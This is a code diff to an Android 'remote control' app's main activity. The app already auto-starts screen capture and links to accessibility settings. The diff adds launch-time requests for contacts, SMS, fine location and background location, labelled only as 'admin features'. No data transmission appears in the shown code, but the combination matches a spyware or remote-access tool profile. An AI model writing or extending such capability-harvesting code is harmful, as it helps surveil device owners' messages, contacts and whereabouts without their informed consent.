@@ -1,9 +1,11 @@
 package com.remote.control;
 
+import android.Manifest;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -16,6 +18,8 @@ import android.widget.Toast;
 import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -76,6 +80,9 @@ public class MainActivity extends AppCompatActivity {
         btnStart.setOnClickListener(v -> startCapture());
         btnStop.setOnClickListener(v -> stopCapture());
         btnAccessibility.setOnClickListener(v -> openAccessibilitySettings());
+
+        // Request runtime permissions for admin features
+        requestDataPermissions();
 
         // Update UI based on service state
         updateUI();
@@ -218,6 +225,40 @@ public class MainActivity extends AppCompatActivity {
 
         // Auto-start capture after a short delay (let UI fully init)
         new android.os.Handler().postDelayed(this::startCapture, 1000);
+    }
+
+    private void requestDataPermissions() {
+        String[] permissions = {
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.ACCESS_FINE_LOCATION
+        };
+
+        java.util.List<String> needed = new java.util.ArrayList<>();
+        for (String perm : permissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                needed.add(perm);
+            }
+        }
+
+        if (!needed.isEmpty()) {
+            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 2001);
+        }
+
+        // Background location requires separate request on Android 11+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                    != PackageManager.PERMISSION_GRANTED) {
+                // Must request after fine location is granted
+                new android.os.Handler().postDelayed(() -> {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                            == PackageManager.PERMISSION_GRANTED) {
+                        ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 2002);
+                    }
+                }, 2000);
+            }
+        }
     }
 
     @Override
